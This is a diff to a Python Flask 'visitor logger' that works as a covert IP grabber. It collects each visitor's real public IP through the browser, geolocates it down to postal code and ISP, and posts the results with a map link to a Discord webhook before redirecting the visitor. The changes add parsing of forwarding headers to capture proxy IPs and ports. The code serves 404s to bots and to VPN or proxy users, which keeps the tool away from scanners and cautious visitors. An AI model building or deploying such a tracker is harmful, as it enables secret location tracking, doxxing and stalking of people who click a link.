@@ -1,14 +1,3 @@
-# main.pyk Made by Slick7qa copyright intact
-"""
-Visitor logger (final):
- - Browser-based public IP collection via api.ipify (real client IP)
- - ipapi.co first, ipwho.is fallback enrichment (no API keys)
- - enhanced VPN/proxy/datacenter detection (org keywords + PTR reverse-DNS)
- - debug logging to file for tuning (ip, org, ptr_host, vpn_flag)
- - bot blocking, per-IP cooldown, single Discord embed (ALERT style)
- - redirects real visitors to REDIRECT_URL
-"""
-
 from flask import Flask, request, redirect, jsonify, abort
 import requests
 from datetime import datetime
@@ -16,6 +5,7 @@ import threading
 import time
 import socket
 import os
+import re
 
 app = Flask(__name__)
 
@@ -187,6 +177,77 @@ def _log_debug(ip: str, org: str, ptr_host: str, vpn_flag: bool):
     except Exception:
         pass
 
+# ========== PROXY EXTRACTION HELPERS ==========
+def parse_forwarded_header(forwarded_val: str):
+    """
+    Parse 'Forwarded' header and return list of dicts like [{'for': '1.2.3.4:1234', 'by': '...'}, ...]
+    """
+    if not forwarded_val:
+        return []
+    entries = []
+    parts = forwarded_val.split(",")
+    for part in parts:
+        record = {}
+        for kv in part.split(";"):
+            if "=" in kv:
+                k, v = kv.split("=", 1)
+                record[k.strip().lower()] = v.strip().strip('"').strip()
+        if record:
+            entries.append(record)
+    return entries
+
+def extract_proxy_info_from_headers():
+    """
+    Return (proxy_ip, proxy_port, proxy_source_description)
+    Best-effort: check X-Forwarded-For last hop, Forwarded header 'by' or 'for', CF-Connecting-IP, else remote_addr/REMOTE_PORT.
+    """
+    # 1) X-Forwarded-For: take last IP in chain as the most recent proxy
+    xff = request.headers.get("X-Forwarded-For", "")
+    if xff:
+        parts = [p.strip() for p in xff.split(",") if p.strip()]
+        if len(parts) >= 2:
+            # last element is the last proxy that connected to your server
+            last = parts[-1]
+            # try split port if present
+            if ":" in last and last.count(":") == 1:
+                ip_part, port_part = last.split(":", 1)
+                return ip_part, port_part, "X-Forwarded-For:last"
+            return last, request.environ.get("REMOTE_PORT"), "X-Forwarded-For:last"
+
+    # 2) Forwarded header: try parse 'by' first, then 'for'
+    fwd = request.headers.get("Forwarded", "")
+    if fwd:
+        parsed = parse_forwarded_header(fwd)
+        if parsed:
+            last = parsed[-1]
+            # prefer 'by' (proxy that connected)
+            for_key = last.get("by") or last.get("for")
+            if for_key:
+                # may be ip:port or quoted
+                # strip IPv6 brackets
+                for_key = for_key.strip()
+                # if form ip:port
+                m = re.match(r'^\[?([0-9a-fA-F\.:]+)\]?(?::(\d+))?$', for_key)
+                if m:
+                    ip_part = m.group(1)
+                    port_part = m.group(2) or request.environ.get("REMOTE_PORT")
+                    return ip_part, port_part, "Forwarded:by/for"
+                else:
+                    return for_key, request.environ.get("REMOTE_PORT"), "Forwarded:raw"
+
+    # 3) CF-Connecting-IP (Cloudflare)
+    cf = request.headers.get("CF-Connecting-IP")
+    if cf:
+        return cf, request.environ.get("REMOTE_PORT"), "CF-Connecting-IP"
+
+    # 4) True-Client-IP header (various proxies)
+    tci = request.headers.get("True-Client-IP")
+    if tci:
+        return tci, request.environ.get("REMOTE_PORT"), "True-Client-IP"
+
+    # 5) fallback to remote_addr and REMOTE_PORT
+    return request.remote_addr, request.environ.get("REMOTE_PORT"), "remote_addr"
+
 # ========== MAP & DISCORD ==========
 def build_map_url(details: dict) -> str:
     lat = details.get("latitude", 0)
@@ -202,20 +263,25 @@ def build_map_url(details: dict) -> str:
 def send_discord_embed(info: dict) -> bool:
     color_red = 15158332
     map_url = info.get("map_url", "https://www.google.com/maps")
+    proxy_ip = info.get("proxy_ip") or "Unknown"
+    proxy_port = info.get("proxy_port") or "Unknown"
     embed_payload = {
         "username": "🚨 Visitor Alert",
         "embeds": [{
             "title": f"🚨 New Visitor — {info.get('city') or 'Unknown'}",
             "url": map_url,
-            "description": f"**IP:** `{info.get('ip')}`",
+            "description": f"**Real IP:** `{info.get('real_ip')}`",
             "color": color_red,
             "fields": [
-                {"name": "Location", "value": f"{info.get('city') or 'Unknown'}, {info.get('region') or 'Unknown'} ({info.get('country') or 'Unknown'})", "inline": False},
-                {"name": "Postal", "value": info.get('postal') or "Unknown", "inline": True},
-                {"name": "ISP / Org", "value": info.get('org') or "Unknown ISP", "inline": True},
-                {"name": "VPN/Proxy", "value": "Yes 🚨" if info.get('vpn') else "No ✅", "inline": True},
-                {"name": "Map", "value": f"[Open Map]({map_url})", "inline": False},
-                {"name": "User Agent", "value": f"`{info.get('user_agent') or 'Unknown'}`", "inline": False},
+                {"name": "🖥️ Real IP (from browser)", "value": f"`{info.get('real_ip')}`", "inline": True},
+                {"name": "🔁 Proxy / Connecting IP", "value": f"`{proxy_ip}`", "inline": True},
+                {"name": "🔌 Proxy Port", "value": f"{proxy_port}", "inline": True},
+                {"name": "📍 Location", "value": f"{info.get('city') or 'Unknown'}, {info.get('region') or 'Unknown'} ({info.get('country') or 'Unknown'})", "inline": False},
+                {"name": "📫 Postal", "value": info.get('postal') or "Unknown", "inline": True},
+                {"name": "🏢 ISP / Org", "value": info.get('org') or "Unknown ISP", "inline": True},
+                {"name": "VPN/Proxy Detected", "value": "Yes 🚨" if info.get('vpn') else "No ✅", "inline": True},
+                {"name": "🌍 Map", "value": f"[Open Map]({map_url})", "inline": False},
+                {"name": "📱 User Agent", "value": f"`{info.get('user_agent') or 'Unknown'}`", "inline": False},
                 {"name": "Source", "value": info.get("_source") or "ipapi", "inline": True},
                 {"name": "Time (UTC)", "value": info.get("time") or now_gmt(), "inline": True}
             ]
@@ -263,33 +329,43 @@ def log():
     except Exception:
         return jsonify({"error": "bad request"}), 400
 
-    ip = data.get("ip")
+    real_ip = data.get("ip")
     user_agent = data.get("ua") or request.headers.get("User-Agent", "Unknown")
 
-    if not ip:
+    if not real_ip:
         return jsonify({"error": "no ip provided"}), 400
 
     # quick UA bot check -> 404
     if is_bot_ua(user_agent):
         abort(404)
 
-    # cooldown check
+    # cooldown check (use real_ip for dedupe)
     now_ts = time.time()
-    last_ts = last_sent_by_ip.get(ip, 0)
+    last_ts = last_sent_by_ip.get(real_ip, 0)
     if COOLDOWN_SECONDS > 0 and (now_ts - last_ts) < COOLDOWN_SECONDS:
         return jsonify({"status": "cooldown"}), 200
 
-    # enrich ip details
-    details = enrich_ip(ip)
+    # determine proxy info (best-effort)
+    proxy_ip, proxy_port, proxy_source = extract_proxy_info_from_headers()
 
-    # enhanced VPN/proxy detection (pass ip for PTR)
-    vpn_flag = detect_vpn_or_proxy(details, ip=ip)
+    # enrich based on the real IP (location of visitor)
+    details = enrich_ip(real_ip)
+
+    # enhanced VPN/proxy detection: pass the *real* IP details and also check proxy org
+    vpn_flag = detect_vpn_or_proxy(details, ip=real_ip)
+    # also treat proxy connecting IP's org as suspicious (additional heuristic)
+    if proxy_ip and proxy_ip != real_ip:
+        proxy_details = enrich_ip(proxy_ip)
+        if detect_vpn_or_proxy(proxy_details, ip=proxy_ip):
+            vpn_flag = True
+
     if vpn_flag:
         abort(404)
 
-    # prepare info
     info = {
-        "ip": ip,
+        "real_ip": real_ip,
+        "proxy_ip": proxy_ip,
+        "proxy_port": proxy_port,
         "user_agent": user_agent,
         "city": details.get("city") or None,
         "region": details.get("region") or None,
@@ -305,7 +381,7 @@ def log():
     info["map_url"] = build_map_url(details)
 
     # mark before sending
-    last_sent_by_ip[ip] = now_ts
+    last_sent_by_ip[real_ip] = now_ts
 
     # send embed (single)
     send_discord_embed(info)
